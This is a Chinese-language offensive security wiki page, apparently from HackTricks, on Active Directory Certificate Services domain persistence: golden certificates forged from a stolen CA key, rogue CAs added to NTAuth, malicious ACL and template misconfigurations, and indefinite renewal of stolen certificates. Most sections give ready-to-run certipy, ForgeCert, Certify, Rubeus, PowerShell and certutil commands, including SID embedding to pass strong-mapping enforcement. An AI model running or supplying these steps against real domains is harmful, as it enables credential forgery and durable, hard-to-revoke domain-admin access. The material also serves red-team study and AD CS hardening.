# AD CS 域持久化

{{#include ../../../banners/hacktricks-training.md}}

**这是对 [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) 中介绍的域持久化技术的总结**。请查阅该文档了解更多详情。<sup>[[5]](#references)</sup>

## 使用窃取的 CA 证书伪造证书（Golden Certificate）- DPERSIST1

如何判断某个证书是否为 CA 证书？

满足以下若干条件即可判断某个证书是 CA 证书：<sup>[[5]](#references)</sup>

- 证书存储在 CA 服务器上，其私钥由计算机的 DPAPI 保护；如果操作系统支持，也可能由 TPM/HSM 等硬件保护。
- 证书的 Issuer 和 Subject 字段均与 CA 的可分辨名称相符。
- 只有 CA 证书才会包含“CA Version”扩展。
- 证书不包含扩展密钥用法（EKU）字段。

要提取该证书的私钥，受支持的方法是在 CA 服务器上使用内置 GUI 工具 `certsrv.msc`。不过，该证书与系统中存储的其他证书并无不同，因此可以使用 [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) 等方法进行提取。

也可以使用 Certipy 通过以下命令获取证书及其私钥：<sup>[[2]](#references)</sup>

```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```

获取 `.pfx` 格式的 CA 证书及其私钥后，可以使用 [ForgeCert](https://github.com/GhostPack/ForgeCert) 等工具生成有效证书：

```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```

> [!WARNING]
> 要使流程成功，证书伪造所针对的用户必须处于启用状态，并且能够在 Active Directory 中进行身份验证。为 krbtgt 等特殊账户伪造证书无效。

此伪造证书在指定的到期日之前都**有效**，并且只要根 CA 证书仍然有效，它就会一直**有效**（通常为 5 到 **10 年以上**）。它也适用于**计算机**，因此结合 **S4U2Self**，攻击者可以在 CA 证书有效期间**在任何域计算机上维持持久化**。\
此外，通过此方法**生成的证书**无法**撤销**，因为 CA 并不知道这些证书的存在。

### 在 Strong Certificate Mapping Enforcement（2025+）下运行

自 2025 年 2 月 11 日起（KB5014754 部署后），域控制器默认对证书映射启用 **Full Enforcement**。实际上，这意味着伪造证书必须满足以下任一条件：

- 包含与目标账户的强绑定（例如 SID 安全扩展），或
- 在目标对象的 `altSecurityIdentities` 属性上配置强显式映射。<sup>[[1]](#references)</sup>

一种可靠的持久化方法是，伪造一张由窃取的 Enterprise CA 签发链验证的证书，然后为受害者主体添加强显式映射：

```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```

注释
- 如果你能制作包含 SID security extension 的伪造证书，那么即使在 Full Enforcement 下，这些证书也会隐式映射。否则，优先使用显式强映射。有关显式映射的更多信息，请参阅 [account-persistence](account-persistence.md)。
- 撤销证书对防御者没有帮助：伪造证书在 CA 数据库中不存在，因此无法撤销。

#### 兼容 Full-Enforcement 的伪造（支持 SID）

更新后的工具允许你直接嵌入 SID，使 golden certificates 即使在 DC 拒绝弱映射时仍可使用：<sup>[[3]](#references)</sup>

```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
  --upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
  --outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
  -sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```

通过嵌入 SID，你可以避免修改可能受到监控的 `altSecurityIdentities`，同时仍满足强映射检查。

## 信任恶意 CA 证书 - DPERSIST2

`NTAuthCertificates` 对象被定义为在其 `cacertificate` 属性中包含一个或多个 **CA 证书**，供 Active Directory (AD) 使用。**域控制器**的验证过程会检查 `NTAuthCertificates` 对象，查找与正在进行身份验证的**证书**的 Issuer 字段中指定的 **CA** 匹配的条目。如果找到匹配项，身份验证便会继续。<sup>[[5]](#references)</sup>

如果攻击者能够控制此 AD 对象，就可以向 `NTAuthCertificates` 对象添加自签名 CA 证书。通常，只有 **Enterprise Admin** 组成员，以及**林根域**中的 **Domain Admins** 或 **Administrators**，才有权限修改此对象。他们可以使用命令 `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` 通过 `certutil.exe` 编辑 `NTAuthCertificates` 对象，也可以使用 [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool)。

此技术的其他实用命令：

```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```

当与之前概述的、使用 ForgeCert 动态生成证书的方法结合时，此能力尤其相关。

> 2025 年后的映射注意事项：将 rogue CA 添加到 NTAuth 只能建立对签发 CA 的信任。若要在 DC 处于 **Full Enforcement** 模式时使用叶证书登录，叶证书必须包含 SID security extension，或者目标对象上必须存在显式强映射（例如 `altSecurityIdentities` 中的 Issuer+Serial）。参见 {{#ref}}account-persistence.md{{#endref}}。

## 恶意错误配置 - DPERSIST3

通过修改 AD CS 组件的 **security descriptor** 来实现 **持久化** 的机会很多。攻击者可利用提升后的访问权限，恶意实施“[域提权](domain-escalation.md)”部分中所述的修改。这包括向以下敏感组件添加“控制权限”（例如 WriteOwner/WriteDACL 等）：<sup>[[5]](#references)</sup>

- **CA server 的 AD computer** 对象
- **CA server 的 RPC/DCOM server**
- **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** 中的任何**后代 AD 对象或容器**（例如 Certificate Templates 容器、Certification Authorities 容器、NTAuthCertificates 对象等）
- 组织明确委派了 CA 或模板控制权限的 **AD 组**。内置的 Cert Publishers 组有权向 AD 中的用户对象发布证书；仅拥有该组成员身份并不会授予 CA 或模板控制权或注册权限。请分别检查相关 CA 和模板的权限。参见 [Microsoft 对 Cert Publishers 的说明](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers) 和 [证书模板权限](https://learn.microsoft.com/en-us/intune/configmgr/protect/plan-design/planning-for-certificate-template-permissions)。

一种恶意实施方式是：在域中拥有**提升权限**的攻击者，将 **`WriteOwner`** 权限添加到默认的 **`User`** 证书模板，并将攻击者设为该权限的主体。要利用此权限，攻击者首先会将 **`User`** 模板的所有权更改为自己。之后，在模板上将 **`mspki-certificate-name-flag`** 设为 **1**，以启用 **`ENROLLEE_SUPPLIES_SUBJECT`**，从而允许用户在请求中提供 Subject Alternative Name。随后，攻击者可使用该**模板**进行**注册**，将**域管理员**的名称选作备用名称，并利用获得的证书以 DA 身份进行身份验证。

攻击者可能设置的长期域持久化实用选项（完整详情和检测方法参见 {{#ref}}domain-escalation.md{{#endref}}）：

- 允许请求者提供 SAN 的 CA 策略标志（例如启用 `EDITF_ATTRIBUTESUBJECTALTNAME2`）。这会使类似 ESC1 的攻击路径持续可利用。
- 允许签发可用于身份验证的模板 DACL 或设置（例如添加 Client Authentication EKU、启用 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`）。
- 控制 `NTAuthCertificates` 对象或 CA 容器，以便在防御者尝试清理时持续重新引入 rogue issuer。

> [!TIP]
> 在应用 KB5014754 后经过强化的环境中，将这些错误配置与显式强映射（`altSecurityIdentities`）结合，可确保签发或伪造的证书在 DC 强制执行强映射时仍然可用。

### 证书续订滥用（ESC14）以实现持久化

如果你攻陷了可用于身份验证的证书（或 Enrollment Agent 证书），只要签发模板仍处于发布状态，且 CA 仍信任签发者链，你就可以**无限期续订该证书**。续订会保留原有身份绑定，同时延长有效期，因此除非修复模板或重新发布 CA，否则很难将其清除。<sup>[[4]](#references)</sup>

```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```

如果域控制器处于 **Full Enforcement**，添加 `-sid <victim SID>`（或使用仍包含 SID security extension 的模板），以确保续期后的叶证书仍能强映射，而无需修改 `altSecurityIdentities`。拥有 CA 管理员权限的攻击者也可以调整 `policy\RenewalValidityPeriodUnits`，在为自己签发证书前延长续期证书的有效期。<sup>[[2]](#references)[[4]](#references)</sup>


## References

- [1] [Microsoft KB5014754 – Windows 域控制器上的基于证书的身份验证变更（强制执行时间表和强映射）](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [Certipy – 命令参考及 forge/auth 用法](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [3] [SpecterOps – Certify 2.0（集成式 forge，支持 SID）](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [ESC14 续期滥用概述](https://www.adcs-security.com/attacks/esc14)
- [5] [SpecterOps – Certified Pre-Owned：滥用 Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
{{#include ../../../banners/hacktricks-training.md}}
